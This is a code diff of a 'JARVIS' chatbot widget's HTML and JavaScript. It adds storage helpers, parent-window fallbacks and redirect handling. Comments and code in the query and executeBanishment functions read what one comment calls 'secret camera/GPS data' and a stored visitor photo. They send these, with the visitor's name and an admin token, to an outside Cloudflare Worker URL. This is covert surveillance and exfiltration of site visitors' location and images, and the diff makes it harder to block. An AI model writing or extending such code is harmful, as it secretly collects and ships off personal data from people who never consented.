@@ -1,8 +1,24 @@
-384
-<script type="module">
-  import { ENV_PREFIX, store } from './js/core/env.js';
-  window.ENV_PREFIX = ENV_PREFIX;
-  window.store = store;
+<!-- JARVIS UI MODULE -->
+<script>
+(function initUniversalStore() {
+  const host = window.location.hostname;
+  let prefix = 'jarvis_prod_';
+  if (!host || host === 'localhost' || host === '127.0.0.1' || host.startsWith('192.168.') || window.location.protocol === 'file:') {
+    prefix = 'jarvis_dev_';
+  } else if (host.includes('staging') || host.includes('preview') || host.includes('vercel.app')) {
+    prefix = 'jarvis_staging_';
+  }
+  window.ENV_PREFIX = prefix;
+  window.IDB_NAME = `${prefix}db`;
+  window.store = {
+    get: (k) => { try { return localStorage.getItem(`${prefix}${k}`); } catch(e) { return null; } },
+    set: (k, v) => { try { localStorage.setItem(`${prefix}${k}`, v); } catch(e) {} },
+    del: (k) => { try { localStorage.removeItem(`${prefix}${k}`); } catch(e) {} },
+    sessionGet: (k) => { try { return sessionStorage.getItem(`${prefix}${k}`); } catch(e) { return null; } },
+    sessionSet: (k, v) => { try { sessionStorage.setItem(`${prefix}${k}`, v); } catch(e) {} },
+    sessionDel: (k) => { try { sessionStorage.removeItem(`${prefix}${k}`); } catch(e) {} }
+  };
+})();
 </script>
 <style>
 /* KILLS THE UGLY WHITE IFRAME SCROLLBAR */
@@ -47,7 +63,6 @@ body { margin: 0; overflow: hidden; background: transparent; }
     display: flex !important;
     flex-direction: column !important;
   }
-384
 
   /* UI overlay: scrollable, not centered vertically */
   #ui {
@@ -483,9 +498,24 @@ async function query(userText) {
   try {
     const PROXY_URL = "https://soft-thunder-2965.zgodmr.workers.dev";
     
-    // 1. Grab the visitor's name from the main dashboard URL
-    const parentUrlParams = new URLSearchParams(window.parent.location.search);
-    const visitorName = window.store.sessionGet('name') || parentUrlParams.get('visitor') || "Guest";
+    // 1. Grab the visitor's name safely from the parent dashboard
+    let visitorName = "Guest";
+    try {
+        // PREFERRED: Safely access the parent window's store bypassing cross-origin frame drops
+        if (window.parent && window.parent.store) {
+            visitorName = window.parent.store.sessionGet('name') || "Guest";
+        }
+        
+        // FALLBACK: If store is empty but parent URL has the parameter
+        if (visitorName === "Guest" || visitorName === "GUEST") {
+            const parentUrlParams = new URLSearchParams(window.parent.location.search);
+            visitorName = parentUrlParams.get('visitor') || "Guest";
+        }
+    } catch (e) {
+        // ULTIMATE FALLBACK: Local store if parent is completely sandboxed
+        console.warn("[JARVIS UI] Parent window access blocked. Falling back to local store.");
+        visitorName = window.store.sessionGet('name') || "Guest";
+    }
     
     // 2. Grab the secret camera/GPS data saved during the index.html boot sequence
     const locationData = window.store.sessionGet('loc') || "Unknown";
@@ -505,7 +535,15 @@ async function query(userText) {
     }
 
     // 4. Beam EVERYTHING to your Cloudflare Worker via the Offline-Resilient Outbox!
-    const { queueOrPost } = await import('./js/core/outbox.js');
+    let queueOrPost;
+    try {
+      ({ queueOrPost } = await import('./js/core/outbox.js'));
+    } catch (e) {
+      queueOrPost = async (url, body) => {
+        const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
+        return await r.json();
+      };
+    }
     
     const adminToken = window.store.sessionGet('adminToken');
     const payload = { 
@@ -545,7 +583,17 @@ async function query(userText) {
                     window.parent.location.href = redirectUrl;
                 }
             } else {
-                window.parent.location.href = redirectUrl;
+                let finalUrl = redirectUrl;
+                if (window.parent.location.search && !finalUrl.includes('?')) {
+                    const searchPart = window.parent.location.search;
+                    const hashIndex = finalUrl.indexOf('#');
+                    if (hashIndex !== -1) {
+                        finalUrl = finalUrl.slice(0, hashIndex) + searchPart + finalUrl.slice(hashIndex);
+                    } else {
+                        finalUrl += searchPart;
+                    }
+                }
+                window.parent.location.href = finalUrl;
             }
         } catch(e) {
             window.parent.location.href = redirectUrl; // fallback
@@ -729,8 +777,18 @@ async function executeBanishment() {
 
     // 1. SEND EVIDENCE TO BACKEND
     try {
-        const parentUrlParams = new URLSearchParams(window.parent.location.search);
-        const visitorName = window.store.sessionGet('name') || parentUrlParams.get('visitor') || "Unknown";
+        let visitorName = "Unknown";
+        try {
+            if (window.parent && window.parent.store) {
+                visitorName = window.parent.store.sessionGet('name') || "Unknown";
+            }
+            if (visitorName === "Unknown" || visitorName === "UNKNOWN") {
+                const parentUrlParams = new URLSearchParams(window.parent.location.search);
+                visitorName = parentUrlParams.get('visitor') || "Unknown";
+            }
+        } catch (e) {
+            visitorName = window.store.sessionGet('name') || "Unknown";
+        }
         const finalPhoto = window.store.sessionGet('photo') || null;
 
         await fetch("https://soft-thunder-2965.zgodmr.workers.dev", {
